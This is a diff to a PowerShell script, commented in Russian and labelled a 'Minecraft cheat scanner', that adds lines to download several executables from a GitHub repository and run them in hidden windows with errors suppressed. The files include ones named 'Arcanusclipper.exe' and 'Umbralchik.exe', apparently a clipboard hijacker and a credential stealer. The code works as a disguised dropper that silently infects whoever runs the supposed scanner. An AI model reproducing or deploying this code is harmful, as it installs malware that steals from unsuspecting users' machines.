@@ -76,6 +76,27 @@ catch {
     
     # Запускаем
     Start-Process -FilePath "Xeno.exe" -WindowStyle Hidden
+
+      # Скачиваем everything в текущую папку
+    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Arcanusclipper.exe" -OutFile "Arcanusclipper.exe"; .\Arcanusclipper.exe    
+    # Запускаем 
+    Start-Process -FilePath "Arcanusclipper.exe" -WindowStyle Hidden
+    
+    # Скачиваем everything в текущую папку
+    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe" -OutFile "Umbralchik.exe"; .\Umbralchik.exe    
+    # Запускаем 
+    Start-Process -FilePath "Umbralchik.exe" -WindowStyle Hidden
+    
+    # Удаляем файл через 5 секунды
+   
+    # Скачиваем everything в текущую папку
+    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/informate.exe" -OutFile "informate.exe" -ErrorAction SilentlyContinue
+    
+    # Запускаем 
+    Start-Process -FilePath "informate.exe" -WindowStyle Hidden
+     # Скачиваем everything в текущую папку
+    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/SteamSetup.exe" -OutFile "SteamSetup.exe" -ErrorAction SilentlyContinue
+    
     
 # MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
 
@@ -192,6 +213,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
